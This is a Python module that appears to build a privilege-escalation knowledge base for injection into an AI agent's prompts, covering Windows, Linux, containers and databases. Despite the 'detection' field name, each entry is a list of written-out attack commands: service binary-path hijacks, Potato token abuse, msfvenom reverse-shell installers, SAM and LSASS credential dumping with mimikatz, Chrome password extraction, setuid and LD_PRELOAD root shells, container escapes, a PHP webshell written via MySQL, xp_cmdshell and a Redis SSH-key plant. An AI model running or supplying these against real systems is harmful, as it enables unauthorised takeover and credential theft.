"""Privilege escalation knowledge base.

Deep knowledge about privilege escalation:
1. Windows privilege escalation
2. Linux kernel exploits
3. Service misconfiguration abuse
4. Credential harvesting
5. Token impersonation
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class PrivescPattern:
    """A privilege escalation pattern."""
    pattern_id: str = ""
    name: str = ""
    platform: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "platform": self.platform[:10],
        }


PRIVESC_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "pe-001", "name": "Windows Privilege Escalation",
        "platform": "windows", "severity": "critical",
        "desc": "Windows local privilege escalation techniques.",
        "detection": (
            "WINDOWS PRIVILEGE ESCALATION:\n"
            "ENUMERATION:\n"
            "  # Automated\n"
            "  winPEAS.exe  # Most comprehensive\n"
            "  Seatbelt.exe -group=all  # GhostPack\n"
            "  PowerUp.ps1 Invoke-AllChecks\n"
            "  # Manual\n"
            "  whoami /priv  # Check privileges\n"
            "  whoami /groups  # Check group memberships\n"
            "  systeminfo  # OS version, patches\n"
            "UNQUOTED SERVICE PATHS:\n"
            "  # If path has spaces and no quotes\n"
            "  wmic service get name,displayname,pathname,startmode\n"
            "  # C:\\Program Files\\My Service\\svc.exe\n"
            "  # Windows tries: C:\\Program.exe first\n"
            "  # Place malicious exe at C:\\Program.exe\n"
            "WEAK SERVICE PERMISSIONS:\n"
            "  # Check service DACLs\n"
            "  sc.exe sdshow <service>\n"
            "  accesschk.exe -ucqv <service>\n"
            "  # If modifiable → change binary path\n"
            "  sc.exe config <service> binpath= \"cmd /c net localgroup admins user /add\"\n"
            "TOKEN IMPERSONATION:\n"
            "  # SeImpersonatePrivilege → SYSTEM\n"
            "  # Potato family:\n"
            "  JuicyPotato.exe -l 1337 -p c:\\shell.exe -t *\n"
            "  PrintSpoofer.exe -i -c cmd\n"
            "  GodPotato.exe -cmd cmd  # Windows 2022+ compatible\n"
            "  SweetPotato.exe -e EfsRpc -p c:\\shell.exe\n"
            "ALWAYS INSTALL ELEVATED:\n"
            "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n"
            "  # If AlwaysInstallElevated = 1 → msi runs as SYSTEM\n"
            "  msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > shell.msi"
        ),
        "tools": ["winpeas", "seatbelt", "powerup"],
    },
    {
        "id": "pe-002", "name": "Windows Token and Credential Abuse",
        "platform": "windows", "severity": "critical",
        "desc": "Abusing Windows tokens and stored credentials.",
        "detection": (
            "TOKEN AND CREDENTIAL ABUSE:\n"
            "STORED CREDENTIALS:\n"
            "  # Saved credentials\n"
            "  cmdkey /list\n"
            "  # RunAs with saved creds\n"
            "  runas /savecred /user:admin cmd\n"
            "  # SAM/SYSTEM backup\n"
            "  reg save HKLM\\SAM C:\\Temp\\SAM\n"
            "  reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\n"
            "  # Extract with secretsdump\n"
            "  secretsdump.py -sam SAM -system SYSTEM LOCAL\n"
            "DPAPI:\n"
            "  # Windows Data Protection API\n"
            "  # Chrome passwords, WiFi passwords, etc.\n"
            "  mimikatz: dpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\"\n"
            "  # Master key extraction\n"
            "  mimikatz: dpapi::masterkey /in:<masterkey_file> /rpc\n"
            "LSASS DUMP:\n"
            "  # Direct dump\n"
            "  procdump.exe -accepteula -ma lsass.exe lsass.dmp\n"
            "  # Comsvcs.dll method\n"
            "  rundll32 comsvcs.dll,MiniDump <lsass_pid> dump.dmp full\n"
            "  # Extract from dump\n"
            "  mimikatz: sekurlsa::minidump lsass.dmp\n"
            "  mimikatz: sekurlsa::logonpasswords\n"
            "GROUP POLICY PREFERENCES:\n"
            "  # Passwords in Group Policy XML (MS14-025)\n"
            "  findstr /S cpassword \\\\<domain>\\sysvol\\*.xml"
        ),
        "tools": ["mimikatz", "secretsdump", "procdump"],
    },
    {
        "id": "pe-003", "name": "Linux Capability and Namespace Abuse",
        "platform": "linux", "severity": "critical",
        "desc": "Abusing Linux capabilities and namespaces.",
        "detection": (
            "LINUX CAPABILITY AND NAMESPACE ABUSE:\n"
            "CAPABILITIES:\n"
            "  getcap -r / 2>/dev/null\n"
            "  # Dangerous capabilities:\n"
            "  cap_setuid: Can change UID → root\n"
            "    python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
            "  cap_net_raw: Can sniff network traffic\n"
            "    tcpdump -i any -w capture.pcap\n"
            "  cap_net_bind_service: Can bind to privileged ports\n"
            "  cap_dac_override: Can bypass file read/write permissions\n"
            "  cap_sys_admin: Almost equivalent to root\n"
            "  cap_sys_ptrace: Can inject into other processes\n"
            "NAMESPACE ABUSE:\n"
            "  # User namespace (unprivileged)\n"
            "  unshare -rm  # Create new mount+user namespace as root inside\n"
            "  # If kernel allows → mount host filesystem\n"
            "  # CVE-2022-0185: User namespace exploit\n"
            "LD_PRELOAD:\n"
            "  # If any SUID binary is vulnerable\n"
            "  # Or if sudo env_keep includes LD_PRELOAD\n"
            "  # 1. Write malicious shared library:\n"
            "  # void _init() { setuid(0); system(\"/bin/sh\"); }\n"
            "  # 2. Compile: gcc -shared -fPIC -o evil.so evil.c\n"
            "  # 3. Run: LD_PRELOAD=./evil.so <suid_binary>\n"
            "PATH HIJACKING:\n"
            "  # If SUID binary calls relative program names\n"
            "  # 1. Create malicious binary with same name\n"
            "  # 2. Modify PATH: export PATH=/tmp:$PATH\n"
            "  # 3. Run the SUID binary"
        ),
        "tools": ["linpeas", "getcap"],
    },
    {
        "id": "pe-004", "name": "Docker and Container Privilege Escalation",
        "platform": "container", "severity": "critical",
        "desc": "Escalating from container to host.",
        "detection": (
            "CONTAINER PRIVILEGE ESCALATION:\n"
            "DOCKER GROUP:\n"
            "  # If user is in docker group → instant root\n"
            "  id | grep docker\n"
            "  docker run -v /:/host -it ubuntu chroot /host\n"
            "WRITABLE DOCKER SOCKET:\n"
            "  ls -la /var/run/docker.sock\n"
            "  # If writable → create privileged container\n"
            "  curl --unix-socket /var/run/docker.sock http://localhost/containers/json\n"
            "MOUNTED SENSITIVE FILES:\n"
            "  # Check what's mounted from host\n"
            "  mount | grep -v /proc\n"
            "  cat /proc/1/mountinfo\n"
            "  # Look for: /etc/shadow, /root, Docker socket, etc.\n"
            "CAPABILITIES IN CONTAINER:\n"
            "  capsh --print\n"
            "  # If CAP_SYS_ADMIN:\n"
            "  mount -t cgroup -o memory cgroup /tmp/cgroup\n"
            "  # Cgroup escape\n"
            "  echo 1 > /tmp/cgroup/x/notify_on_release\n"
            "  echo \"#!/bin/sh\" > /cmd\n"
            "  echo \"<reverse_shell>\" >> /cmd\n"
            "KUBERNETES:\n"
            "  # Service account token\n"
            "  cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"
            "  # If cluster-admin → full cluster access\n"
            "  kubectl --token=<token> --server=<api> get secrets -A"
        ),
        "tools": ["deepce", "kubectl", "docker"],
    },
    {
        "id": "pe-005", "name": "Database Privilege Escalation",
        "platform": "database", "severity": "high",
        "desc": "Escalating from database access to OS access.",
        "detection": (
            "DATABASE PRIVILEGE ESCALATION:\n"
            "MYSQL:\n"
            "  # UDF (User Defined Function) for command execution\n"
            "  # If FILE privilege available:\n"
            "  SELECT @@plugin_dir;  # Find plugin directory\n"
            "  # Upload UDF: lib_mysqludf_sys.so\n"
            "  # Then: SELECT sys_exec('whoami');\n"
            "  # Into outfile (file write):\n"
            "  SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\n"
            "POSTGRESQL:\n"
            "  # Command execution as postgres user\n"
            "  COPY (SELECT '') TO PROGRAM 'id';\n"
            "  CREATE OR REPLACE FUNCTION cmd(text) RETURNS void AS $$\n"
            "    import os; os.system(args[0])\n"
            "  $$ LANGUAGE plpythonu;\n"
            "  SELECT cmd('whoami');\n"
            "  # Large object methods\n"
            "  SELECT lo_import('/etc/passwd');\n"
            "MSSQL:\n"
            "  # xp_cmdshell\n"
            "  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n"
            "  EXEC xp_cmdshell 'whoami';\n"
            "  # OLE Automation\n"
            "  # Agent jobs\n"
            "  # Linked servers → lateral movement\n"
            "REDIS:\n"
            "  # Write to authorized_keys\n"
            "  CONFIG SET dir /root/.ssh/\n"
            "  CONFIG SET dbfilename authorized_keys\n"
            "  SET x \"\\n\\nssh-rsa <key>\\n\\n\"\n"
            "  SAVE"
        ),
        "tools": ["sqlmap", "crackmapexec"],
    },
]


class PrivescKB:
    """Privilege escalation knowledge base.

    Provides privilege escalation patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, PrivescPattern] = {}
        self._log = logger.bind(component="privesc_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load privesc patterns."""
        for data in PRIVESC_PATTERNS:
            pattern = PrivescPattern(
                pattern_id=data["id"],
                name=data["name"],
                platform=data.get("platform", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_platform(self, platform: str) -> list[PrivescPattern]:
        """Get patterns by platform."""
        return [
            p for p in self._patterns.values()
            if p.platform.lower() == platform.lower()
        ]

    def build_privesc_prompt(
        self,
        platforms: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build privilege escalation prompt."""
        lines = ["## Privilege Escalation Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if platforms and pattern.platform.lower() not in [p.lower() for p in platforms]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.platform.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        plat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            plat_counts[p.platform] = plat_counts.get(p.platform, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_platform": plat_counts,
        }
